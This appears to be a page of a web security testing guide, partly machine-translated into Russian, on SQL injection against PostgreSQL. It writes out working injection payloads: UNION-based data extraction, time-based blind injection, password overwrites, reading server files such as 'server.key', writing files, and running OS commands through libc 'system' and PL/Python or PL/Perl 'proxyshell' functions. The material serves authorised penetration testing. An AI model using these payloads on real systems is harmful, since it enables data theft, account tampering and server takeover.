# Тестирование PostgreSQL

## Резюме

В этом разделе будут обсуждаться некоторые методы SQL-инъекции для PostgreSQL. Эти методы имеют следующие характеристики:

- PHP Connector позволяет выполнять несколько операторов с помощью `;` как разделитель операторов
- Операторы SQL можно усечь, добавив символ комментария: `--`.
- `LIMIT` and `OFFSET` can be used in a `SELECT` оператор для получения части набора результатов, сгенерированного `query`

Отныне предполагается, что `http://www.example.com/news.php?id=1` уязвим для атак SQL Injection.

## Как проверить

### Идентификация PostgreSQL

Когда SQL Injection был найден, вам необходимо тщательно продумать механизм базы данных бэкэнда. Вы можете определить, что движок базы данных бэкэнда - PostgreSQL, используя *::* оператор актерского состава.

#### Примеры

`http://www.example.com/store.php?id=1 AND 1::int=1`

Кроме того, функция *version()* можно использовать для захвата баннера PostgreSQL. Это также покажет базовый тип и версию операционной системы.

##### Пример

`http://www.example.com/store.php?id=1 UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1--`

Пример строки баннера, которую можно вернуть:

`PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)`

### Слепой впрыск

Для слепых атак с использованием SQL-инъекций следует учитывать следующие встроенные функции:

- Длина струны
`LENGTH(str)`

- Извлечь подстроку из данной строки
`SUBSTR(str,index,offset)`

- Строковое представление без отдельных кавычек
`CHR(104)||CHR(101)||CHR(108)||CHR(108)||CHR(111)`

Начиная с версии 8.2, PostgreSQL ввел встроенную функцию `pg_sleep(n)`, заставить текущий процесс сеанса спать в течение `n` секунд. Эту функцию можно использовать для выполнения временных атак (подробно обсуждается на [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)).

Кроме того, вы можете легко создать заказ `pg_sleep(n)` в предыдущих версиях с использованием libc :

- `CREATE function pg_sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' LANGUAGE 'C' STRICT`

### Одиночная цитата Unescape

Строки могут быть закодированы, чтобы предотвратить экранирование одинарных кавычек с помощью `chr()` функция.

- `chr(n)`: возвращает символ, значение ASCII которого соответствует номеру `n`
- `ascii(n)`: возвращает значение ASCII, которое соответствует символу `n`

Допустим, вы хотите кодировать строку 'root':

```sql
select ascii('r')
114
select ascii('o')
111
select ascii('t')
116
```

Мы можем кодировать «root» как:

`chr(114)||chr(111)||chr(111)||chr(116)`

#### Пример

`http://www.example.com/store.php?id=1; UPDATE users SET PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--`

### Атакующие векторы

#### Текущий пользователь

Идентификационные данные текущего пользователя можно получить с помощью следующих операторов SQL SELECT:

```sql
SELECT user
SELECT current_user
SELECT session_user
SELECT usename FROM pg_user
SELECT getpgusername()
```

##### Пример

```text
http://www.example.com/store.php?id=1 UNION ALL SELECT user,NULL,NULL--
http://www.example.com/store.php?id=1 UNION ALL SELECT current_user, NULL, NULL--
```

#### Текущая база данных

Встроенная функция current \ _database () возвращает текущее имя базы данных.

##### Пример

`http://www.example.com/store.php?id=1 UNION ALL SELECT current_database(),NULL,NULL--`

#### Чтение из файла

PostgreSQL предоставляет два способа доступа к локальному файлу:

- `COPY` statement
- `pg_read_file()` внутренняя функция (начиная с PostgreSQL 8.1)

##### КОПИЯ

Этот оператор копирует данные между файлом и таблицей. Механизм PostgreSQL обращается к локальной файловой системе как пользователь `postgres`.

###### Пример

```text
/store.php?id=1; CREATE TABLE file_store(id serial, data text)--
/store.php?id=1; COPY file_store(data) FROM '/var/lib/postgresql/.psql_history'--
```

Данные должны быть получены путем выполнения `UNION Query SQL Injection`:

- извлекает количество строк, ранее добавленных в `file_store` with `COPY` заявление
- извлекает строку за раз с помощью UNION SQL Injection

```text
/store.php?id=1 UNION ALL SELECT NULL, NULL, max(id)::text FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 2;--
...
...
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 11;--
```

##### pg_read_file()

Эта функция была введена в `PostgreSQL 8.1` и позволяет читать произвольные файлы, расположенные в каталоге данных СУБД.

###### Пример

`SELECT pg_read_file('server.key',0,1000);`

#### Запись в файл

Возвращая оператор COPY, мы можем записать в локальную файловую систему с правами пользователя `postgres `

`/store.php?id=1; COPY file_store(data) TO '/var/lib/postgresql/copy_output'--`

#### Shell Injection

PostgreSQL предоставляет механизм для добавления пользовательских функций с использованием как динамической библиотеки, так и языков сценариев, таких как python, perl и tcl.

##### Динамическая библиотека

До PostgreSQL 8.1 можно было добавлять пользовательскую функцию, связанную с `libc`:

`CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT`

Since `system` returns an `int` how we can fetch results from `system` stdout?

Here's a little trick:

- create a `stdout` table: `CREATE TABLE stdout(id serial, system_out text)`
- executing a shell command redirecting its `stdout`: `SELECT system('uname -a > /tmp/test')`
- use a `COPY` statements to push output of previous command in `stdout` table: `COPY stdout(system_out) FROM '/tmp/test*'`
- retrieve output from `stdout`: `SELECT system_out FROM stdout`

###### Example

```text
/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) --
/store.php?id=1; CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE 'C'
STRICT --
/store.php?id=1; SELECT system('uname -a > /tmp/test') --
/store.php?id=1; COPY stdout(system_out) FROM '/tmp/test' --
/store.php?id=1 UNION ALL SELECT NULL,(SELECT system_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--
```

##### Plpython

PL/Python allows users to code PostgreSQL functions in python. It's untrusted so there is no way to restrict what user can do. It's not installed by default and can be enabled on a given database by `CREATELANG`

- Check if PL/Python has been enabled on a database: `SELECT count(*) FROM pg_language WHERE lanname='plpythonu'`
- If not, try to enable: `CREATE LANGUAGE plpythonu`
- If either of the above succeeded, create a proxy shell function: `CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os; return os.popen(args[0]).read() 'LANGUAGE plpythonu`
- Have fun with: `SELECT proxyshell(os command);`

###### Example

- Create a proxy shell function: `/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS ‘import os;return os.popen(args[0]).read()’ LANGUAGE plpythonu;--`
- Run an OS Command: `/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`

##### Plperl

Plperl allows us to code PostgreSQL functions in perl. Normally, it is installed as a trusted language in order to disable runtime execution of operations that interact with the underlying operating system, such as `open`. By doing so, it's impossible to gain OS-level access. To successfully inject a proxyshell like function, we need to install the untrusted version from the `postgres` user, to avoid the so-called application mask filtering of trusted/untrusted operations.

- Check if PL/perl-untrusted has been enabled: `SELECT count(*) FROM pg_language WHERE lanname='plperlu'`
- If not, assuming that sysadm has already installed the plperl package, try: `CREATE LANGUAGE plperlu`
- If either of the above succeeded, create a proxy shell function: `CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu`
- Have fun with: `SELECT proxyshell(os command);`

###### Example

- Create a proxy shell function: `/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu;`
- Run an OS Command: `/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`

## References

- [Testing for SQL Injection](05-Testing_for_SQL_Injection.md)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PostgreSQL Official Documentation](https://www.postgresql.org/docs/)
- [Bernardo Damele and Daniele Bellucci: sqlmap, a blind SQL injection tool](https://sqlmap.org/)
